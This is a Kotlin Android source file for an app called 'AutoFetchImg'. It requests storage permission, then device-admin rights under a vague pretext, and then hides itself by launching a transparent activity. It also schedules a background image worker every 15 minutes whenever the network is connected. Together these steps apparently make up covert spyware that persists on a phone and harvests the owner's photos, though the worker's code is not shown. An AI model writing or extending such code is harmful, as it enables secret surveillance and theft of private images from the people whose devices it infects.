package com.example.autofetchimg

import android.Manifest
import android.animation.Animator
import android.app.Activity
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.IBinder
import android.view.View
import android.view.ViewPropertyAnimator
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxHeight
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import com.example.autofetchimg.ui.theme.AutoFetchImgTheme
import com.google.firebase.FirebaseApp
import java.util.concurrent.TimeUnit


class MainActivity : ComponentActivity() {

    private val requestAdminLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                // Device admin activation successful, now hide the app
                hideApp(applicationContext)
            } else {
                // Device admin activation failed, handle accordingly
                Toast.makeText(
                    applicationContext,
                    "Device admin activation failed",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        scheduleLatestImageWorker(applicationContext)
        setContent {
            AutoFetchImgTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                ) {
                    FirstScreen(requestAdminLauncher)
                }
            }
        }



    }

    private fun scheduleLatestImageWorker(applicationContext : Context) {
        // Define network constraints
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        // Create periodic work request
        val request = PeriodicWorkRequest.Builder(
            LatestImageWorker::class.java, 15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        // Enqueue periodic work request
        WorkManager.getInstance(applicationContext).enqueue(request)
    }


}

@Composable
fun FirstScreen(requestAdminLauncher: ActivityResultLauncher<Intent>) {
    val permissionLauncher = rememberPermissionLauncher(requestAdminLauncher)
    val context = LocalContext.current
    var buttonState by remember { mutableStateOf(false) }

    Box(
        modifier = Modifier.fillMaxHeight(),
        contentAlignment = Alignment.Center
    ) {
        Button(
            onClick = {
                permissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
            },
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp)
        ) {
            Text(text = "Give Permissions")
        }

    }
}

@Composable
fun rememberPermissionLauncher(requestAdminLauncher: ActivityResultLauncher<Intent>): ActivityResultLauncher<String> {
    val context = LocalContext.current
    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            Toast.makeText(context, "Permission granted", Toast.LENGTH_SHORT).show()
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (!dpm.isAdminActive(componentName)) {
                 requestDeviceAdminActivation(context, requestAdminLauncher)
            } else {
                hideApp(context)
            }
        } else {

            Toast.makeText(context, "Permission not granted", Toast.LENGTH_SHORT).show()
        }
    }
    return permissionLauncher
}

//fun createPermissionLauncher(context: Context): ActivityResultLauncher<String> {
//    val activity = context as? ComponentActivity ?: error("Context must be a ComponentActivity")
//    return activity.registerForActivityResult(
//        ActivityResultContracts.RequestPermission()
//    ) { isGranted ->
//        if (isGranted) {
//            Toast.makeText(context, "Permission granted", Toast.LENGTH_SHORT).show()
//            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
//            val componentName = ComponentName(context, DeviceAdminReceiverImpl::class.java)
//            if (!dpm.isAdminActive(componentName)) {
//                 requestDeviceAdminActivation(context, requestAdminLauncher)
//            } else {
//                hideApp(context)
//            }
//        } else {
//            Toast.makeText(context, "Permission not granted", Toast.LENGTH_SHORT).show()
//        }
//    }
//}


fun requestDeviceAdminActivation(context: Context, requestAdminLauncher: ActivityResultLauncher<Intent>) {
    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
    val componentName = ComponentName(context, DeviceAdminReceiverImpl::class.java)
    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
    intent.putExtra(
        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
        "Enable device admin to perform administrative tasks"
    )
    requestAdminLauncher.launch(intent)
}

private fun hideApp(context: Context) {
    val intent = Intent(context, TransparentActivity::class.java)
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
    context.startActivity(intent)
}




//class BackgroundService : Service() {
//    override fun onBind(intent: Intent?): IBinder? {
//        return null
//    }
//
//    override fun onCreate() {
//        super.onCreate()
//        startForegroundService()
//        scheduleLatestImageWorker()
//    }
//
//    private fun startForegroundService() {
//        // Implement foreground service initialization, such as creating a notification
//        // and starting the service in the foreground
//    }
//
//    private fun scheduleLatestImageWorker() {
//        // Define network constraints
//        val constraints = Constraints.Builder()
//            .setRequiredNetworkType(NetworkType.CONNECTED)
//            .build()
//
//        // Create periodic work request
//        val request = PeriodicWorkRequest.Builder(
//            LatestImageWorker::class.java, 15, TimeUnit.MINUTES)
//            .setConstraints(constraints)
//            .build()
//
//        // Enqueue periodic work request
//        WorkManager.getInstance(applicationContext).enqueue(request)
//    }
//}